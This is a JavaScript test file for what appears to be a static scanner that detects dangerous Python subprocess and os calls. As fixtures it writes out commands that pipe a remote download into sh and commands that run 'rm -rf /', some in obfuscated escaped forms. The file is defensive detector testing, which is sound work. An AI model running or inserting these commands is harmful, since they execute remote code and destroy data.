import { afterEach, beforeEach, expect, it } from 'vitest';
import { createRequire } from 'node:module';
import { createHash } from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const require = createRequire(import.meta.url);
const { scanStaticDirectory } = require('../../src/main/static-analysis');
let root;
beforeEach(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'aegis-static-python-'));
});
afterEach(() => {
  expect(path.dirname(path.resolve(root))).toBe(path.resolve(os.tmpdir()));
  fs.rmSync(root, { recursive: true, force: true });
});
async function scan(source) {
  fs.writeFileSync(path.join(root, 'commands.py'), source);
  return scanStaticDirectory('package', root);
}

it('finds an aliased subprocess shell command without exposing source values', async () => {
  const source =
    'import subprocess as sp\nsp.run("curl https://PRIVATE.invalid/install | sh", shell=True)\n';
  const report = await scan(source);
  expect(report.findings).toEqual([
    expect.objectContaining({
      ruleId: 'STA001',
      path: 'commands.py',
      line: 2,
      context: 'python-command',
      sha256: createHash('sha256').update(source).digest('hex'),
    }),
  ]);
  expect(report.files[0].analysis).toBe('python-command-syntax');
  expect(report.safety).toBe('not-determined');
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it('preserves subprocess argv and refuses to guess shell=True sequence semantics', async () => {
  const prefix = 'import subprocess as sp\n';
  const literal = await scan(prefix + 'sp.run(["curl", "https://example.invalid", "|", "sh"])\n');
  expect(literal.findings).toEqual([]);
  expect(literal.complete).toBe(true);
  const deletion = await scan(prefix + 'sp.run(["rm", "-rf", "/"])\n');
  expect(deletion.findings).toContainEqual(expect.objectContaining({ ruleId: 'STA003' }));
  const shellSequence = await scan(
    prefix + 'sp.run(["curl", "https://example.invalid", "|", "sh"], shell=True)\n',
  );
  expect(shellSequence.findings).toEqual([]);
  expect(shellSequence.issues).toContainEqual({
    path: 'commands.py',
    reason: 'python-shell-sequence-not-resolved',
  });
});

it('resolves a function-local import alias and a single-assignment command string', async () => {
  const report = await scan(
    [
      'def task():',
      '    from subprocess import check_output as launch',
      "    command = 'cu' + r'rl https://PRIVATE.invalid | sh'",
      '    launch(command, shell=True)',
    ].join('\n'),
  );
  expect(report.findings).toEqual([expect.objectContaining({ ruleId: 'STA001', line: 4 })]);
  expect(report.issues).toContainEqual({
    path: 'commands.py',
    reason: 'python-control-flow-not-evaluated',
  });
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it('invalidates process-module knowledge after a method is replaced', async () => {
  const report = await scan(
    'import subprocess as sp\nsp.run = lambda *args, **kwargs: None\nsp.run("curl https://example.invalid | sh", shell=True)\n',
  );
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({
    path: 'commands.py',
    reason: 'python-mutation-not-resolved',
  });
});

it.each([
  ['from subprocess import Popen as launch\nlaunch(["rm", "-rf", "/"])', 'STA003'],
  ['import subprocess\nsubprocess.call(["rm", "-rf", "/"])', 'STA003'],
  ['from subprocess import check_call\ncheck_call(args=("rm", "-rf", "/"))', 'STA003'],
  ['import subprocess\nsubprocess.getoutput("curl https://PRIVATE.invalid | sh")', 'STA001'],
  [
    'import subprocess\nsubprocess.getstatusoutput(cmd="curl https://PRIVATE.invalid | sh")',
    'STA001',
  ],
  ['import os\nos.system("rm -rf /")', 'STA003'],
  ['from os import popen as launch\nlaunch("curl https://PRIVATE.invalid | sh")', 'STA001'],
  [
    'import os, subprocess as sp\nalias = sp.run\ncommand = "curl " "https://PRIVATE.invalid | sh"\nalias(command, shell=True)',
    'STA001',
  ],
  ['import os\nos.system("\\x72\\155 -rf \\u002f")', 'STA003'],
  ['import os\nos.system("""curl https://PRIVATE.invalid | sh""")', 'STA001'],
  [
    'from subprocess import (run as launch,)\nlaunch(["sh", "-c", "curl https://PRIVATE.invalid | sh"])',
    'STA001',
  ],
])('reviews supported Python process calls (case %#)', async (source, ruleId) => {
  const report = await scan(source);
  expect(report.findings.map((finding) => finding.ruleId)).toEqual([ruleId]);
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it.each([
  '"""import os\nos.system("rm -rf /")\n"""\n# os.system("rm -rf /")',
  'import subprocess as sp\nsp.run(["echo", "curl https://example.invalid | sh"])',
  'import subprocess as sp\nsp.run(["rm", "-rf", "./dist"])',
  'import subprocess as sp\nsp.run(["npx", "tool@1.2.3"])',
])(
  'keeps harmless literal examples and ordinary argv free of findings (case %#)',
  async (source) => {
    const report = await scan(source);
    expect(report.findings).toEqual([]);
    expect(report.complete).toBe(true);
    expect(report.safety).toBe('not-determined');
  },
);

it.each([
  'def task(sp):\n    sp.run("rm -rf /", shell=True)',
  'def task():\n    sp.run("rm -rf /", shell=True)\n    sp = other',
  'try:\n    pass\nexcept Error as sp:\n    sp.run("rm -rf /", shell=True)',
  'for sp in items:\n    sp.run("rm -rf /", shell=True)',
  'with manager as sp:\n    sp.run("rm -rf /", shell=True)',
  'result = [sp.run("rm -rf /", shell=True) for sp in items]',
  'result = lambda sp: sp.run("rm -rf /", shell=True)',
  'class Local:\n    sp.run("rm -rf /", shell=True)',
  'type sp = object\nsp.run("rm -rf /", shell=True)',
  'def task[sp]():\n    sp.run("rm -rf /", shell=True)',
  'match value:\n    case sp:\n        sp.run("rm -rf /", shell=True)',
  'def task(\uff53\uff50):\n    sp.run("rm -rf /", shell=True)',
  'def task():\n    global sp\n    sp.run("rm -rf /", shell=True)',
])('avoids attributing unresolved local names to process modules (case %#)', async (body) => {
  const report = await scan('import subprocess as sp\n' + body);
  expect(report.findings).toEqual([]);
  expect(report.complete).toBe(false);
});

it.each([
  ['sp.run(PRIVATE, shell=True)', 'python-command-not-resolved'],
  ['sp.run("rm -rf /")', 'python-command-string-not-resolved'],
  ['sp.run(["rm", PRIVATE])', 'python-command-not-resolved'],
  ['argv = ["rm", "-rf", "/"]\nsp.run(argv)', 'python-mutable-binding-not-resolved'],
  ['sp.run("rm -rf /", shell=PRIVATE)', 'python-shell-not-resolved'],
  ['sp.run(["echo"], executable="PRIVATE")', 'python-executable-override-not-resolved'],
  ['sp.run(*PRIVATE)', 'python-call-arguments-not-resolved'],
  ['sp.run("rm -rf /", **PRIVATE)', 'python-call-arguments-not-resolved'],
  ['sp.run(b"rm -rf /", shell=True)', 'python-string-not-resolved'],
  ['sp.run(f"{PRIVATE}", shell=True)', 'python-command-not-resolved'],
  ['from .subprocess import run\nrun("rm -rf /", shell=True)', 'python-module-not-resolved'],
  ['from PRIVATE import *\nsp.run("rm -rf /", shell=True)', 'python-module-not-resolved'],
  [
    'command = "rm -rf /"\ncommand = "echo done"\nsp.run(command, shell=True)',
    'python-binding-not-resolved',
  ],
  ['exec("PRIVATE")\nsp.run("rm -rf /", shell=True)', 'python-dynamic-code-not-analyzed'],
  [
    'setattr(sp, "run", PRIVATE)\nsp.run("rm -rf /", shell=True)',
    'python-module-escape-not-resolved',
  ],
  ['wrapped = {"module": sp}\nsp.run("rm -rf /", shell=True)', 'python-module-escape-not-resolved'],
])(
  'reports dynamic or unsupported cases without exposing source (case %#)',
  async (body, reason) => {
    const report = await scan('import subprocess as sp\n' + body);
    expect(report.findings).toEqual([]);
    expect(report.complete).toBe(false);
    expect(report.issues).toContainEqual({ path: 'commands.py', reason });
    expect(JSON.stringify(report)).not.toContain('PRIVATE');
  },
);

it.each([
  ['if False:\n    os.system("rm -rf /")', 3],
  ['os.system("rm -rf /") if False else None', 2],
  ['False and os.system("rm -rf /")', 2],
  ['True or os.system("rm -rf /")', 2],
])('keeps conditional findings separate from execution claims (case %#)', async (body, line) => {
  const report = await scan('import os\n' + body);
  expect(report.findings).toContainEqual(expect.objectContaining({ ruleId: 'STA003', line }));
  expect(report.issues).toContainEqual({
    path: 'commands.py',
    reason: 'python-control-flow-not-evaluated',
  });
});

it('reports unexamined process options alongside a known command', async () => {
  const report = await scan(
    'import subprocess\nsubprocess.run("rm -rf /", shell=True, env={"PRIVATE": "secret"})',
  );
  expect(report.findings).toContainEqual(expect.objectContaining({ ruleId: 'STA003' }));
  expect(report.issues).toContainEqual({
    path: 'commands.py',
    reason: 'python-process-options-not-analyzed',
  });
  expect(JSON.stringify(report)).not.toContain('PRIVATE');
});

it.each([
  ['import PRIVATE as\n', 'python-parse-failed'],
  ['# PRIVATE\n' + ' '.repeat(65536), 'python-size-limit'],
  ['x = ' + '('.repeat(65) + 'PRIVATE' + ')'.repeat(65), 'python-tree-limit'],
  ['pass\n'.repeat(8300) + '# PRIVATE', 'python-parser-limit'],
  ['import os\nos.system("' + 'PRIVATE'.repeat(2400) + '")', 'python-value-limit'],
  ['# coding: latin-1\nimport os\nos.system("rm -rf /")', 'python-source-encoding-not-supported'],
])(
  'bounds malformed or oversized Python input with fixed reasons (case %#)',
  async (source, reason) => {
    const report = await scan(source);
    expect(report.findings).toEqual([]);
    expect(report.complete).toBe(false);
    expect(report.issues).toContainEqual({ path: 'commands.py', reason });
    expect(JSON.stringify(report)).not.toContain('PRIVATE');
  },
);

it('bounds exponential alias expansion without evaluating it', async () => {
  const lines = ['import os', 'value0 = ""'];
  for (let i = 1; i < 25; i++) lines.push(`value${i} = value${i - 1} + value${i - 1}`);
  const report = await scan(lines.join('\n') + '\nos.system(value24)');
  expect(report.findings).toEqual([]);
  expect(report.issues).toContainEqual({ path: 'commands.py', reason: 'python-value-limit' });
});

it('caps Python command inspections and declares the added coverage', async () => {
  const report = await scan('import os\n' + 'os.system("rm -rf /")\n'.repeat(257));
  expect(report.files[0].commands).toBe(256);
  expect(report.findings).toHaveLength(256);
  expect(report.issues).toContainEqual({ path: 'commands.py', reason: 'command-count-limit' });
  expect(report.limits).toMatchObject({
    pythonChars: 65536,
    pythonParseSteps: 8192,
    pythonNodes: 8192,
    pythonDepth: 64,
    pythonValueSteps: 8192,
  });
  expect(report.scope).toMatchObject({
    python: 'literal-subprocess-and-os-calls',
    pythonControlFlow: 'not-evaluated',
  });
});
